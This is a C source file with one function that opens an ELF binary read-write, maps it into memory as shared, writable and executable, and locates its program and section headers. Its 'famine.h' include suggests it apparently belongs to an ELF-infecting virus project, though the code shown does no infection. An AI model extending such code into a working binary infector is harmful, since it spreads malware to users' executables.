
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>

#include "famine.h"

/*
 * - Open the file specified by fname
 * - Calculate the size of this file
 * - Create a mapping in the virtual address space of the calling process
 * - Define fd, fsize, ehdr, phdr and shdr into t_elf
 * - Return the value of the opened fd on success
 * - Return -1 on error
 */
int	elf_open_and_map(t_elf	*elf)
{
	elf->fd = -1;
	elf->fsize = 0;
	elf->ehdr = NULL;

	elf->fd = open(elf->fname, O_APPEND | O_RDWR, 0);
	if (elf->fd == -1)
	{
#if DEBUG
		perror("open:");
#endif
		return -1;
	}

	elf->fsize = lseek(elf->fd, 0, SEEK_END);
	if (elf->fsize == -1) {
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}
	else if (lseek(elf->fd, 0, SEEK_SET) == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}

	elf->ehdr = mmap(0, elf->fsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, elf->fd, 0);
	if (elf->ehdr == MAP_FAILED)
	{
#if DEBUG
		perror("mmap:");
#endif
		return -1;
	}
	elf->phdr = (Elf64_Phdr *)((uint64_t)elf->ehdr + (uint64_t)elf->ehdr->e_phoff);
	elf->shdr = (Elf64_Shdr *)((uint64_t)elf->ehdr + (uint64_t)elf->ehdr->e_shoff);

#if DEBUG
		printf("+File %s mapped: %ld bytes at %p\n", elf->fname, elf->fsize, (void *)elf->ehdr);
#endif
		return elf->fd;
}
